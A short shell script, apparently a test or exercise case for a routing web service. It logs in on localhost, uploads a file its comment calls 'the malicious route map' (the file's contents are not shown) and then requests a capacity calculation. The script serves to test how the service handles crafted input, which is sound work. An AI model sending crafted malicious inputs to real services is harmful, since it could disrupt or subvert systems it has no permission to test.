#!/bin/sh

# log in
../../../examples/login.sh usr pwd

# upload the malicious route map
curl -s -b cookies.txt -F file=@capacity_routemap.txt -F "route_map_name=map_one" --insecure https://localhost:8443/add_route_map

# calculate the cost capacity between 0 and 3
curl -s -L -b cookies.txt -F "origin=287790814" -F "destination=161804169" -F "weight=cost" --insecure https://localhost:8443/capacity/1553932502
